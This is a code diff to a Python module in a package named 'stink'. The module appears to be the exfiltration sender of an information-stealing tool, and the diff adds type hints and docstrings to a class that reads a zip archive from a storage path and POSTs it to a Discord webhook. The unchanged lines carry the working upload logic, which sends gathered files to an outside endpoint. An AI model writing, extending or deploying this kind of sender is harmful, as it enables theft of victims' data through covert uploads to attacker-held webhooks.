@@ -1,4 +1,5 @@
 from os import path
+from typing import Tuple, Union
 from urllib.request import Request, urlopen
 
 from stink.helpers import MultipartFormDataEncoder
@@ -6,14 +7,19 @@ from stink.utils.senders.abstract import AbstractSender
 
 
 class Discord(AbstractSender):
-
+    """
+    Sender for the Discord.
+    """
     def __init__(self, webhook: str):
         super().__init__()
 
         self.__webhook = webhook
 
-    def __get_sender_data(self):
-
+    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
+        """
+        Gets data to send.
+        :return: (str|bytes, ...)
+        """
         with open(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip", "rb") as file:
             content_type, body = MultipartFormDataEncoder(self.__errors).encode(
                 [],
@@ -24,8 +30,11 @@ class Discord(AbstractSender):
 
         return content_type, body, self.__webhook
 
-    def __send_archive(self):
-
+    def __send_archive(self) -> None:
+        """
+        Sends the data.
+        :return: None
+        """
         content_type, body, link = self.__get_sender_data()
         query = Request(method="POST", url=link, data=body)
 
@@ -34,8 +43,14 @@ class Discord(AbstractSender):
 
         urlopen(query)
 
-    def run(self, zip_name: str, storage_path: str, errors: bool):
-
+    def run(self, zip_name: str, storage_path: str, errors: bool) -> None:
+        """
+        Launches the sender module.
+        :param zip_name: str
+        :param storage_path: str
+        :param errors: bool
+        :return: None
+        """
         self.__zip_name = zip_name
         self.__storage_path = storage_path
         self.__errors = errors
